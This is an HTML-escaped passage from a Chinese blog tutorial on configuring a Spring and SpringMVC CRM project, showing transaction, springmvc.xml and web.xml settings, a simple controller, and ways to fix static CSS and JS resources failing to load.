            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;insert*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;add*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;create*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;delete*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;update*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;find*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;SUPPORTS&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;select*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;SUPPORTS&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;get*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;SUPPORTS&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;query*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;SUPPORTS&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tx:attributes&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tx:advice&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 切面 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;aop:config&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;aop:advisor &lt;/span&gt;&lt;span&gt;advice-ref&lt;/span&gt;&lt;span&gt;=&quot;txAdvice&quot;&lt;/span&gt;&lt;span&gt;
            pointcut&lt;/span&gt;&lt;span&gt;=&quot;execution(* cn.itcast.crm.service.*.*(..))&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;aop:config&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.7. &lt;strong&gt;Springmvc.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;配置&lt;/span&gt;SpringMVC&lt;span&gt;表现层：&lt;/span&gt;&lt;span&gt;Controller&lt;/span&gt;&lt;span&gt;扫描、注解驱动、视图解析器&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt; xmlns:p&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:mvc&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
        http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.0.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置Controller扫描 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:component-scan &lt;/span&gt;&lt;span&gt;base-package&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.controller&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置注解驱动 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:annotation-driven &lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置视图解析器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 前缀 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;prefix&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;/WEB-INF/jsp/&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 后缀 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;suffix&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;.jsp&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.8. &lt;strong&gt;Web.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;配置&lt;/span&gt;Spring&lt;span&gt;、&lt;/span&gt;&lt;span&gt;SpringMVC&lt;/span&gt;&lt;span&gt;、解决&lt;/span&gt;&lt;span&gt;post&lt;/span&gt;&lt;span&gt;乱码问题&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;web-app &lt;/span&gt;&lt;span&gt;xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://java.sun.com/xml/ns/javaee&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot;&lt;/span&gt;&lt;span&gt;
    id&lt;/span&gt;&lt;span&gt;=&quot;WebApp_ID&quot;&lt;/span&gt;&lt;span&gt; version&lt;/span&gt;&lt;span&gt;=&quot;2.5&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;display-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;boot-crm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;display-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;welcome-file-list&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;welcome-file&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;index.jsp&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;welcome-file&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;welcome-file-list&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置spring &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;classpath:spring/applicationContext-*.xml&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;context-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置监听器加载spring &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.context.ContextLoaderListener&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置过滤器，解决post的乱码问题 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;filter&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;filter-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;encoding&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;filter-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;filter-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;filter-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Encoding&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;utf-8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;filter&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;filter-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;filter-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;encoding&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;filter-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;/*&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;filter-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置SpringMVC &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;boot-crm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework.web.servlet.DispatcherServlet&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;contextConfigLocation&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;classpath:spring/springmvc.xml&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;param-value&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;init-param&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置springmvc什么时候启动，参数必须为整数 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 如果为0或者大于0，则springMVC随着容器启动而启动 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 如果小于0，则在第一次请求进来的时候启动 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;boot-crm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 所有的请求都进入springMVC &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;/&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;web-app&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;3.6. &lt;strong&gt;加入静态资源&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;最终效果如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711222344582-2094297253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;h2&gt;4.1. &lt;strong&gt;代码实现&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;编写&lt;/span&gt;CustomerController &lt;span&gt;显示用户列表&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Controller
@RequestMapping(&lt;/span&gt;&quot;customer&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomerController {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 显示用户列表
     * 
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @RequestMapping(&lt;/span&gt;&quot;list&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String queryCustomerList() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;customer&quot;&lt;span&gt;;
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;4.2. &lt;strong&gt;页面显示问题&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;访问页面，发现不能正常显示&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711222410308-609505819.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;打开开发者工具，选择&lt;/span&gt;Network&lt;span&gt;，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;发现&lt;/span&gt;css&lt;span&gt;、&lt;/span&gt;&lt;span&gt;js&lt;/span&gt;&lt;span&gt;等资源文件无法加载&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711222417337-1691219457.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;原因：&lt;/span&gt;web.xml&lt;span&gt;配置时，是设置所有的请求都进入&lt;/span&gt;&lt;span&gt;SpringMVC&lt;/span&gt;&lt;span&gt;。但是&lt;/span&gt;&lt;span&gt;SpringMVC&lt;/span&gt;    &lt;span&gt;无法处理&lt;/span&gt;css&lt;span&gt;、&lt;/span&gt;&lt;span&gt;js&lt;/span&gt;&lt;span&gt;等静态资源，所以无法正常显示&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;解决方案：&lt;/p&gt;

&lt;p&gt;&lt;span&gt;方法一：通过&lt;/span&gt;mvc:resources&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 对静态资源进行放行 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:resources &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;/css/&quot;&lt;/span&gt;&lt;span&gt; mapping&lt;/span&gt;&lt;span&gt;=&quot;/css/**&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:resources &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;/fonts/&quot;&lt;/span&gt;&lt;span&gt; mapping&lt;/span&gt;&lt;span&gt;=&quot;/fonts/**&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:resources &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;/js/&quot;&lt;/span&gt;&lt;span&gt; mapping&lt;/span&gt;&lt;span&gt;=&quot;/js/**&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;方法二：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;springmvc.xml&lt;span&gt;中配置&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 解决静态资源无法被springMVC处理的问题 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:default-servlet-handler &lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 方法三：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;修改&lt;/span&gt;web.xml&lt;span&gt;，让所有以&lt;/span&gt;&lt;span&gt;action&lt;/span&gt;&lt;span&gt;结尾的请求都进入&lt;/span&gt;&lt;span&gt;SpringMVC&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;boot-crm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 所有的请求都进入springMVC &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;*.action&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;解决后的效果如下图，可以正常显示页面样式：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711222941157-723673276.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;我们使用第二种方式解决，因为此项目中的页面的请求都是以&lt;/span&gt;action&lt;span&gt;结尾的，所以使用第二种方式，在&lt;/span&gt;&lt;span&gt;web.xml&lt;/span&gt;&lt;span&gt;里面进行相应的配置&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;boot-crm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 所有以action结尾的请求都进入springMVC &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
